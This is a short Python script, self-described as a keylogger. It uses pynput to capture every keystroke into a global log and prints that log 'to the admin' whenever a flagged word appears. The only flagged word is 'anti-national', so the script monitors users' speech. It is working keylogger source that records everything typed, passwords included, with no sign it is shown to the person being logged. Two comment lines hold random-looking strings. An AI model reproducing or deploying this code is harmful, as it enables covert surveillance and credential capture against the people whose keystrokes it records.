import time
import threading
from pynput import keyboard

# Set the bad words list (you can expand this list as needed)
BAD_WORDS = ["anti-national"]


# Keylogger variables
log = ""
logging = True


# Function to handle key presses
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += " [" + str(key) + "] "

    # Check for bad language in the log
    check_bad_language()

#uSAKFUKAYWEFDShello
#oegfsadilhxdyegshello
# Function to check for bad language in the log
def check_bad_language():
    global log
    for word in BAD_WORDS:
        if word in log:
            print_message()
            

# Function to start the keylogger
def start_keylogger():
    global logging
    with keyboard.Listener(on_press=on_press) as listener:
        while logging:
            time.sleep(1)


# Function to print message to the admin
def print_message():
    global log
    body = "The following log contains offensive language:\n\n" + log
    message = f" \n{body}"
    print(message)
    log = ""
    

# Main function
if __name__ == "__main__":
    # Start the keylogger thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    try:
        while True:
            # Keep the main thread running to allow Ctrl+C to stop the program
            time.sleep(1)
    except KeyboardInterrupt:
        # Stop the keylogger and alarm
        logging = False
        keylogger_thread.join()
        print("Keylogger stopped.")